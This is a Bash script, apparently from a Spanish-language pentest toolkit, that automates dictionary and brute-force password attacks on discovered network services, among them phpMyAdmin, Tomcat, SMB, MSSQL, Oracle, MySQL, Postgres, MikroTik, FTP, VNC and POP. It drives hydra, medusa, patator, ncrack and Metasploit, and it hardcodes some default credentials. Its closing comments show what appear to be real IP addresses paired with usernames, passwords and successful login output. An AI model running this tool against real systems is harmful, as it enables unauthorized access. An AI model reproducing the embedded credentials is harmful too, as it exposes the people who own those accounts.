#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
                            

max_ins=10

echo -e '  ______                  _                         __   ______ '
echo -e ' / _____)                | |                       /  | / __   |'
echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
echo ''
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"



while getopts ":e:d:t:h:" OPTIONS
do
            case $OPTIONS in
            e)     ENTIDAD=$OPTARG;;
            t)     TYPE=$OPTARG;;
            d)     DICTIONARY=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

ENTIDAD=${ENTIDAD:=NULL}
DICTIONARY=${DICTIONARY:=NULL}
TYPE=${TYPE:=NULL}

if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 

cat << "EOF"

Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)

Opciones: 
-e : Nombre de la empresa (Usado para generar diccionario de passwords)
 
-d :Diccionario de passwords a usar (opcional)

Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
	cracker.sh -e microsoft -t completo

Ejemplo 2: Ataque de diccionario con lista de passwords
	cracker.sh -d passwords.txt -t completo
EOF

exit
fi
######################

rm enumeracion/* 2>/dev/null
rm .vulnerabilidades/* 2>/dev/null

if [ $DICTIONARY = NULL ] ; then

	echo $ENTIDAD > base.txt
	passGen.sh -f base.txt -t top200 -o top.txt 
	rm base.txt
else
	mv $DICTIONARY top.txt	

fi

echo "postgres" >> top.txt	
echo "mysql" >> top.txt	
echo "cisco" >> top.txt	
echo "wordpress" >> top.txt	
echo "joomla" >> top.txt	
echo "drupal" >> top.txt	

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
	insert-data.py	
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}
	

if [ -f .servicios/admin-web.txt ]
then

	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre paneles de administracion web activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	  
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 		  	
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"	
			
		for line in $(cat .servicios/admin-web.txt); do
			echo -e "\n\t########### $line #######"
			ip_port=`echo $line | cut -d "/" -f 3`
			path=`echo $line | cut -d "/" -f 4`		
			ip=`echo $ip_port | cut -d ":" -f 1`
			port=`echo $ip_port | cut -d ":" -f 2`
		
			result=`webData.pl -t $ip -d "/$path/" -p $port -e todo -l /dev/null -r 4`	
			result=`echo "$result" | tr '[:upper:]' '[:lower:]'` # a minusculas
			
			if [[ $result = *"phpmyadmin"* ]]; then
				echo -e "\t[+] phpMyAdmin identificado"
				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u root -f top.txt > logs/cracking/$ip-$port-phpmyadminPassword.txt &
				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u admin -f top.txt >> logs/cracking/$ip-$port-phpmyadminPassword.txt &
				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u wordpress -f top.txt >> logs/cracking/$ip-$port-phpmyadminPassword.txt &
				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u joomla -f top.txt >> logs/cracking/$ip-$port-phpmyadminPassword.txt &
				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u drupal -f top.txt >> logs/cracking/$ip-$port-phpmyadminPassword.txt &
				
				######## wait to finish########
				while true; do
					passWeb_instances=$((`ps aux | grep passWeb | wc -l` - 1)) 
					if [ "$passWeb_instances" -gt 0 ]
					then
						echo -e "\t[i] Todavia hay escaneos de passWeb activos ($passWeb_instances)"  
						sleep 30
					else
						break		  		 
					fi				
				done
				##############################

				grep --color=never 'encontrado' logs/cracking/$ip-$port-phpmyadminPassword.txt | sort | uniq > .vulnerabilidades/$ip-$port-phpmyadminPassword.txt 
			fi	
						
			if [[ $result = *"tomcat"* ]]; then
				echo -e "\t[+] Tomcat identificado"
				
				patator http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/$ip-$port-passTomcat.txt 2>> logs/cracking/$ip-$port-passTomcat.txt				
				#si encontro el password
				egrep -iq "200 OK" logs/cracking/$ip-$port-passTomcat.txt
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t[i] Password encontrado"
					# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
					password=`grep --color=never "200 OK" logs/cracking/$ip-$port-passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
					echo "password $password"
					echo "$line (Usuario:tomcat Password:$password)" > .vulnerabilidades/$ip-$port-passTomcat.txt								
				fi
															
		
				patator http_fuzz method=GET url=$line user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/$ip-$port-passTomcat1.txt 2>> logs/cracking/$ip-$port-passTomcat1.txt				
				#si encontro el password
				egrep -iq "200 OK" logs/cracking/$ip-$port-passTomcat1.txt
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t[i] Password encontrado"
					# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
					password=`grep --color=never "200 OK" logs/cracking/$ip-$port-passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
					echo "$line (Usuario:admin Password:$password)" > .vulnerabilidades/$ip-$port-passTomcat.txt								
				fi
												
				
				patator http_fuzz method=GET url=$line user_pass=manager:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/$ip-$port-passTomcat2.txt 2>> logs/cracking/$ip-$port-passTomcat2.txt
				#si encontro el password
				egrep -iq "200 OK" logs/cracking/$ip-$port-passTomcat2.txt
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t[i] Password encontrado"
					# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
					password=`grep --color=never "200 OK" logs/cracking/$ip-$port-passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
					echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/$ip-$port-passTomcat.txt								
				fi
				
				patator http_fuzz method=GET url=$line user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/$ip-$port-passTomcat3.txt 2>> logs/cracking/$ip-$port-passTomcat3.txt
				#si encontro el password
				egrep -iq "200 OK" logs/cracking/$ip-$port-passTomcat3.txt
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t[i] Password encontrado"
					# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
					password=`grep --color=never "200 OK" logs/cracking/$ip-$port-passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
					echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/$ip-$port-passTomcat.txt								
				fi
				
			fi			
		done			
		insert_data
	 fi	
fi

if [ -f .servicios/cisco.txt ]
then	
	
	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	  
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	
	  
		echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
		for ip in $(cat .servicios/cisco.txt); do			
			egrep -iq "80/open" .nmap_1000p/$ip-tcp.grep
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "[+] Probando $ip"
				patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/$ip-80-ciscoPassword.txt 2>> logs/cracking/$ip-80-ciscoPassword.txt
				sleep 2			
				grep --color=never '200 OK' logs/cracking/$ip-80-ciscoPassword.txt | tee -a  .vulnerabilidades/$ip-80-ciscoPassword.txt
				echo ""
			fi
						
		done
		insert_data
	 fi	
fi


if [ -f .servicios/PRTG.txt ]
then

	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre PRTG activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	  
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	   	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
		for line in $(cat .servicios/PRTG.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
						
			echo -e "[+] Probando $ip"
			passWeb.pl -t $ip -p 80 -d / -m PRTG -u prtgadmin -f top.txt > logs/cracking/$ip-PRTG-password.txt
			sleep 2
			grep --color=never 'encontrado' logs/cracking/$ip-PRTG-password.txt | tee -a .vulnerabilidades/$ip-PRTG-password.txt
			
			echo ""			
		done
		insert_data
	 fi	
fi


if [ -f .servicios/web401.txt ]
then

	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre web 401 activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	  
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	     	
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass web ######################$RESET"	
		for ip in $(cat .servicios/web401.txt); do
			echo -e "[+] Probando $ip"			
			patator http_fuzz method=GET url="http://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/$ip-80-adminPassword.txt 2>> logs/cracking/$ip-80-adminPassword.txt
			sleep 2
			grep --color=never '200 OK' logs/cracking/$ip-80-adminPassword.txt | tee -a  .vulnerabilidades/$ip-80-adminPassword.txt
			patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/$ip-80-rootPassword.txt 2>> logs/cracking/$ip-80-rootPassword.txt
			sleep 2
			grep --color=never '200 OK' logs/cracking/$ip-80-rootPassword.txt | tee -a  .vulnerabilidades/$ip-80-rootPassword.txt
			echo ""			
		done
		insert_data
	 fi	
fi

if [ -f .servicios/Windows.txt ]
then
		
	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios SMB activos (Windows). Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	  
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	

	 echo -e "$OKBLUE\n\t#################### Windows auth ######################$RESET"	    
	 for ip in $(cat .servicios/Windows.txt); do		
		echo -e "[+] Probando $ip"
		hostlive=`nmap -n -Pn -p 445 $ip`
		if [[ ${hostlive} == *"open"*  ]];then 
		
			hydra -l administrador -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l administrator -P top.txt -t 1 $ip smb >> logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l soporte -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l sistemas -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l $ENTIDAD -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null		
			sleep 2
			egrep --color=never 'password:' logs/cracking/$ip-windows.txt | tee -a .vulnerabilidades/$ip-windows-passwordHost.txt
			
			#https://github.com/m4ll0k/SMBrute (shared)
		
		else
			echo "$ip (Equipo apagado)"
		fi									
	 done	
	 insert_data
   fi # if bruteforce   
fi



if [ -f .servicios/ZKSoftware.txt ]
then

	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios de ZKSoftware activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	  
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	  	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
		for ip in $(cat .servicios/ZKSoftware.txt); do
			echo -e "[+] Probando $ip"		
			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt > logs/cracking/$ip-80-passwordZKSoftware.txt
			grep --color=never 'encontrado' logs/cracking/$ip-80-passwordZKSoftware.txt | tee -a .vulnerabilidades/$ip-80-passwordZKSoftware.txt
			echo ""			
		done
		insert_data
	 fi	
fi


if [ -f .servicios/mssql.txt ]
then

	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios MS-SQL activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	   
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	

	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
	 for line in $(cat .servicios/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip"						
		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/$ip-mssql.txt
		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/$ip-mssql.txt
		medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql >>  logs/cracking/$ip-mssql.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-mssql.txt > .vulnerabilidades/$ip-mssql-passwordBD.txt
		
	 done	
	 insert_data
   fi # if bruteforce
fi


if [ -f .servicios/oracle.txt ]
then
	if [ "$TYPE" = NULL ] ; then		
		echo -e "\n\t $OKBLUE Encontre servicios oracle activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	   
	fi
	
	#https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
				
		export SQLPATH=/opt/oracle/instantclient_18_3
		export TNS_ADMIN=/opt/oracle/instantclient_18_3
		export LD_LIBRARY_PATH=/opt/oracle/instantclient_18_3
		export ORACLE_HOME=/opt/oracle/instantclient_18_3

	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
	 for line in $(cat .servicios/oracle.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip"
		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/$ip-oracle-password.txt 2>/dev/null		
		egrep --color=never 'Found' logs/vulnerabilidades/$ip-oracle-password.txt | tee -a .vulnerabilidades/$ip-oracle-passwordBD.txt
		
	 done	
	 insert_data
   fi # if bruteforce
fi

if [ -f .servicios/postgres.txt ]
then

	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios postgres activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	    
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 

	 echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
	 for line in $(cat .servicios/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip"
		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
		medusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-postgres.txt > .vulnerabilidades/$ip-postgres-passwordBD.txt
		
	 done	
	 insert_data
   fi # if bruteforce
fi


if [ -f .servicios/MikroTik.txt ]
then
	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre dispositivos MikroTik. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	    
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
	      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
	  for ip in $(cat .servicios/MikroTik.txt); do		
		echo -e "[+] Probando $ip"
				
		mkbrutus.py -t $ip -u admin --dictionary top.txt | tee -a  logs/cracking/$ip-8728-passwordMikroTik.txt
		mkbrutus.py -t $ip -u $ENTIDAD --dictionary top.txt | tee -a  logs/cracking/$ip-8728-passwordMikroTik.txt
		grep --color=never successful logs/cracking/$ip-8728-passwordMikroTik.txt > .vulnerabilidades/$ip-8728-passwordMikroTik.txt
		
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi

if [ -f .servicios/mysql.txt ]
then
	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios de MySQL activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	     
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
       	
		echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
		for line in $(cat .servicios/mysql.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			echo -e "[+] Probando $ip"
			hostlive=`nmap -n -Pn -p 3306 $ip`
			if [[ ${hostlive} == *"open"*  ]];then   	  
				medusa -e n -u root -P top.txt -h $ip -M mysql >>  logs/cracking/$ip-mysql.txt
				medusa -e n -u mysql -P top.txt -h $ip -M mysql >> logs/cracking/$ip-mysql.txt
				medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql >>  logs/cracking/$ip-mysql.txt
				grep --color=never -i SUCCESS logs/cracking/$ip-mysql.txt | tee -a .vulnerabilidades/$ip-mysql-passwordBD.txt
				echo ""			
			else
				echo "Host apagado"
			fi
			
			
		done
		insert_data		
	fi # if bruteforce
fi



#if [ -f .servicios/vmware.txt ]
#then

	#if [ "$TYPE" = NULL ] ; then
		#echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
		#read bruteforce	     
	#fi
	  	
	#if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
      	  
	  #echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  #for line in $(cat .servicios/vmware.txt); do
		#ip=`echo $line | cut -f1 -d":"`
		#port=`echo $line | cut -f2 -d":"`
		#echo -e "[+] Probando $ip"
#		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt	
		#medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt
		#grep --color=never SUCCESS logs/cracking/$ip-vmware.txt > .vulnerabilidades/$ip-vmware-password.txt
#		echo ""			
	 #done
	 #insert_data
#	fi # if bruteforce
#fi


if [ -f .servicios/mongoDB.txt ]
then
	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios de mongoDB activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	      
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
	     	  
	  echo -e "$OKBLUE\n\t#################### Testing  mongoDB ######################$RESET"	
	  for line in $(cat .servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip"
		echo "nmap -n -sV -p $port --script=mongodb-brute $ip"  > logs/cracking/$ip-monogodb-password.txt 2>/dev/null 
		nmap -n -sV -p $port --script=mongodb-brute $ip  >> logs/cracking/$ip-monogodb-password.txt 2>/dev/null 
		grep "|" logs/cracking/$ip-monogodb-password.txt > .vulnerabilidades/$ip-monogodb-password.txt 
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi

if [ -f .servicios/redis.txt ]
then
	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios de redis activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	       
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
     	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass redis ######################$RESET"	
	  for line in $(cat .servicios/redis.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		echo "nmap -n -sV -p $port --script=redis-brute $ip"  > logs/cracking/$ip-redis-password.txt 2>/dev/null 
		nmap -n -sV -p $port --script=redis-brute $ip  >> logs/cracking/$ip-redis-password.txt 2>/dev/null 
		grep "|" logs/cracking/$ip-redis.txt > .vulnerabilidades/$ip-redis-password.txt 
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi


if [ -f .servicios/informix.txt ]
then
	
	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios de informix (SFI) activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	       
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
   	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass informix (SFI) ######################$RESET"	
	  for line in $(cat .servicios/informix.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		echo -e "\t [+] Probando password por defecto (SFI)"
		medusa -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/$ip-SFI-password.txt 2>/dev/null
		medusa -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/$ip-SFI-password.txt 2>/dev/null
		medusa -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/$ip-SFI-password.txt 2>/dev/null
		medusa -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/$ip-SFI-password.txt 2>/dev/null
		medusa -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/$ip-SFI-password.txt 2>/dev/null		
		grep --color=never SUCCESS logs/vulnerabilidades/$ip-SFI-password.txt > .vulnerabilidades/$ip-SFI-password.txt 					
	 done
	 insert_data
	fi # if bruteforce
fi



if [ -f .servicios/ftp.txt ]
then

	if [ "$TYPE" = NULL ] ; then
		echo -e "\n\t $OKBLUE Encontre servicios de FTP activos. Realizar ataque de passwords ? s/n $RESET"	  
		read bruteforce	        
	fi
	  	
	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
		for line in $(cat .servicios/ftp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		######## revisar si no es impresora #####
		egrep -iq "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" .enumeracion2/$ip-23-banner.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t [+] Es una impresora"
		else			
			echo -e "[+] Probando $ip"		
			
			medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			medusa -e n -u root -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			medusa -e n -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			#medusa -e n -u test -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			grep --color=never SUCCESS logs/cracking/$ip-ftp.txt > .vulnerabilidades/$ip-ftp-password.txt
			echo ""		
		fi	
		#######################################		
				
		done
		insert_data
	 fi	
fi

echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
grep -ira "timed out" logs/cracking/*
grep -ira "Can't connect" logs/cracking/*
	
exit

if [ -f .servicios/pop.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then     			
      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
	  read users_file  	  
	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass POP ######################$RESET"	
	  for line in $(cat .servicios/pop.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"	
		for fullname in $(cat $users_file); do
			echo -e "\n\t########### Testing fullname $fullname #######"			
			generate-password.pl "$fullname" > passwords2.txt # password en base a su usuario
			head -1 passwords2.txt > base.txt # solo primer nombre
			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
			username=`tail -1 passwords2.txt` # dtorres
			echo -e "\n\t[+] username $username"			
			patator pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/$ip-pop-$username.txt 2>> logs/cracking/$ip-pop-$username.txt		
			grep --color=never messages logs/cracking/$ip-pop-$username.txt >> .vulnerabilidades/$ip-pop-password.txt
			echo ""					
			rm passwords.txt passwords2.txt passwords3.txt			
			echo "Dormir 5 min"
			sleep 300;
		done					
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi
	

if [ -f .servicios/pop3pw.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de pop3pw activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then     			
      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
	  read users_file  	  
	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass POP  ######################$RESET"	
	  for line in $(cat .servicios/pop3pw.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"	
		for fullname in $(cat $users_file); do
			echo -e "\n\t########### Testing fullname $fullname #######"			
			generate-password.pl "$fullname" > passwords2.txt # password en base a su usuario
			head -1 passwords2.txt > base.txt # solo primer nombre
			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
			username=`tail -1 passwords2.txt` # dtorres
			echo -e "\n\t[+] username $username"			
			patator pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/$ip-pop3pw-$username.txt 2>> logs/cracking/$ip-pop3pw-$username.txt		
			grep --color=never "new password " logs/cracking/$ip-pop3pw-$username.txt >> .vulnerabilidades/$ip-pop3pw-password.txt
			echo ""					
			rm passwords.txt passwords2.txt passwords3.txt			
			echo "Dormir 5 min"
			sleep 300;
		done					
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi	




if [ -f .servicios/vnc.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de VNC activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
	  for line in $(cat .servicios/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"					
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
		then
			ncrack --user 'administrador' -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/$ip-vnc-password.txt &			
			echo ""		
		else
			echo "Max instancias de ncrack ($max_ins)"
			sleep 10;
				
		fi		
		
	  done
	  
	  sleep 5
	  ### wait to finish
	  while true; do
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -gt 0 ]
		then
			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	
	  echo -e "\n\t########### Checking success #######"	
	  for line in $(cat .servicios/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
						
		grep --color=never "administrador" logs/cracking/$ip-vnc-password.txt > .vulnerabilidades/$ip-vnc-password.txt
		echo ""			
	  done
	 
	 	 
	 insert_data
	fi # if bruteforce
fi
	

#patator pop_login host=181.115.239.243 user=msanti password='Bichito$9'
#17:20:24 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 17:20 EDT
#17:20:24 patator    INFO -                                                                              
#17:20:24 patator    INFO - code  size   time | candidate                          |   num | mesg
#17:20:24 patator    INFO - -----------------------------------------------------------------------------
#17:20:25 patator    INFO - +OK   32    0.094 |                                    |     1 | 3076 messages (263203895 octets)


#patator pop_passd host=190.129.11.29 user=jaguilar password=jhashy275
#16:40:34 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 16:40 EDT
#16:40:34 patator    INFO -                                                                              
##16:40:34 patator    INFO - code  size   time | candidate                          |   num | mesg
#16:40:34 patator    INFO - -----------------------------------------------------------------------------
#16:40:34 patator    INFO - 200   25    0.127 |                                    |     1 | Your new password please



